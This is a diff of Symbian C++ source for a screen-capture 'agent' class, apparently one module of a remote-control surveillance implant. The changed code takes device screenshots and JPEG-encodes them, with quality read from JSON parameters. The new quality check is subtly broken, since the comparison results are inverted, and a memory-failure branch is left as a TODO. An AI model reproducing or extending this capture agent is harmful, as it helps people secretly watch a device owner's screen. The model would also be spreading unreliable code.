@@ -12,7 +12,7 @@
 #include <gdi.h>
 #include <COEMAIN.H>
 #include "AgentSnapshot.h"
-
+#include "Json.h"
 
 CAgentSnapshot::CAgentSnapshot() :
 	CAbstractAgent(EAgent_Snapshot)
@@ -22,7 +22,6 @@ CAgentSnapshot::CAgentSnapshot() :
 
 CAgentSnapshot::~CAgentSnapshot()
 	{
-	delete iTimer;
 	delete iScreenDevice;
 	delete iBitmap;
 	iWsSession.Close();
@@ -43,50 +42,61 @@ CAgentSnapshot* CAgentSnapshot::NewL(const TDesC8& params)
 	return self;
 	}
 
-void CAgentSnapshot::ConstructL(const TDesC8& params)
+void CAgentSnapshot::ConstructL(const TDesC8& aParams)
 	{
-	BaseConstructL(params);
+	BaseConstructL(aParams);
 	
-	TUint8* ptr = (TUint8 *)iParams.Ptr();
-	TUint32 interval=0;               // time interval, in milliseconds, between screenshots
-	Mem::Copy( &interval, ptr, 4);
-	ptr += 4;
-	TUint32 windCapt=0;				 //  0 = capture whole screen, 1 = capture only foreground window 	
-	Mem::Copy(&windCapt,ptr,4 );
-	
-	iSecondsInterv = (interval / 1000);
-	
+	//read parameters
+	RBuf paramsBuf;
+				
+	TInt err = paramsBuf.Create(2*aParams.Size());
+	if(err == KErrNone)
+		{
+		paramsBuf.Copy(aParams);
+		}
+	else
+		{
+		//TODO: not enough memory
+		}
+			
+	paramsBuf.CleanupClosePushL();
+	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
+	CleanupStack::PushL(jsonBuilder);
+	jsonBuilder->BuildFromJsonStringL(paramsBuf);
+	CJsonObject* rootObject;
+	jsonBuilder->GetDocumentObject(rootObject);
+	if(rootObject)
+		{
+		CleanupStack::PushL(rootObject);
+		//get image quality
+		TBuf<8> qualityBuf;
+		rootObject->GetStringL(_L("quality"),qualityBuf);
+		if(qualityBuf.Compare(_L("hi")))
+			{
+			iQuality = 100;
+			}
+		else if(qualityBuf.Compare(_L("med")))
+			{
+			iQuality = 90;
+			}
+		else
+			{
+			iQuality = 80;
+			}
+		CleanupStack::PopAndDestroy(rootObject);
+		}
+	CleanupStack::PopAndDestroy(jsonBuilder);
+	CleanupStack::PopAndDestroy(&paramsBuf);
+
 	iWsSession.Connect();
 	iScreenDevice = new(ELeave) CWsScreenDevice(iWsSession);
 	iScreenDevice->Construct();
-
-	iTimer = CTimeOutTimer::NewL(*this);
 	}
 
 void CAgentSnapshot::StartAgentCmdL()
 	{
-	TTime time;
-	time.HomeTime();
-	time += iSecondsInterv;
-	iTimer->RcsAt(time);
-	}
-
-void CAgentSnapshot::StopAgentCmdL()
-	{
-	iTimer->Cancel();
-	}
-
-
-
-void CAgentSnapshot::TimerExpiredL(TAny* src)
-	{
-	TTime time;
-	time.HomeTime();
-	time += iSecondsInterv;
-	iTimer->RcsAt(time);
-	
 	DoCaptureL();
-	
+		
 	RBuf8 buf(GetImageBufferL());
 	buf.CleanupClosePushL();
 	if (buf.Length() > 0)
@@ -105,12 +115,14 @@ void CAgentSnapshot::TimerExpiredL(TAny* src)
 			}
 		}
 	CleanupStack::PopAndDestroy(&buf);
-	 
+	}
+
+void CAgentSnapshot::StopAgentCmdL()
+	{
 	}
 
 void CAgentSnapshot::DoCaptureL()
     {
-	
 	TPixelsTwipsAndRotation sizeAndRotation;
 	iScreenDevice->GetScreenModeSizeAndRotation(iScreenDevice->CurrentScreenMode(), sizeAndRotation);
 
@@ -122,36 +134,34 @@ void CAgentSnapshot::DoCaptureL()
 	TInt err = iScreenDevice->CopyScreenToBitmap(iBitmap);
 	if (err == KErrNone)
 		iCapturedScreen = ETrue;
-	
 	}
 
 HBufC8* CAgentSnapshot::GetImageBufferL()
 	{
-		if (!iCapturedScreen)
-			return HBufC8::NewL(0); 
+	if (!iCapturedScreen)
+		return HBufC8::NewL(0); 
 
-		CFrameImageData* frameImageData = CFrameImageData::NewL();
-		CleanupStack::PushL(frameImageData);
-		TJpegImageData* imageData = new (ELeave) TJpegImageData();
-		imageData->iSampleScheme  = TJpegImageData::EColor444;
-		imageData->iQualityFactor = 80; // = low, set 90 for normal or 100 for high 
-		frameImageData->AppendImageData(imageData);
+	CFrameImageData* frameImageData = CFrameImageData::NewL();
+	CleanupStack::PushL(frameImageData);
+	TJpegImageData* imageData = new (ELeave) TJpegImageData();
+	imageData->iSampleScheme  = TJpegImageData::EColor444;
+	imageData->iQualityFactor = iQuality; // 80= low, set 90 for normal or 100 for high 
+	frameImageData->AppendImageData(imageData);
 				
-		HBufC8* imageBuf = NULL;
-		CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
-		CleanupStack::PushL(iencoder);
-		TRequestStatus aStatus = KErrNone; 
-		iencoder->Convert( &aStatus, *iBitmap, frameImageData );
-		User::WaitForRequest( aStatus );
-		CleanupStack::PopAndDestroy(iencoder);
+	HBufC8* imageBuf = NULL;
+	CImageEncoder* iencoder  = CImageEncoder::DataNewL(imageBuf,_L8("image/jpeg"),CImageEncoder::EOptionAlwaysThread);
+	CleanupStack::PushL(iencoder);
+	TRequestStatus aStatus = KErrNone; 
+	iencoder->Convert( &aStatus, *iBitmap, frameImageData );
+	User::WaitForRequest( aStatus );
+	CleanupStack::PopAndDestroy(iencoder);
 				
-		CleanupStack::PopAndDestroy(frameImageData);
+	CleanupStack::PopAndDestroy(frameImageData);
 
-		// this is just to be sure: if iWsSession is closed before iBitmap is deleted, a panic FBSLIB reason 2 is raised!
-		delete iBitmap;
-		iBitmap = NULL;
-		
-		return imageBuf;
-		
+	// this is just to be sure: if iWsSession is closed before iBitmap is deleted, a panic FBSLIB reason 2 is raised!
+	delete iBitmap;
+	iBitmap = NULL;
+	
+	return imageBuf;
 	}
 
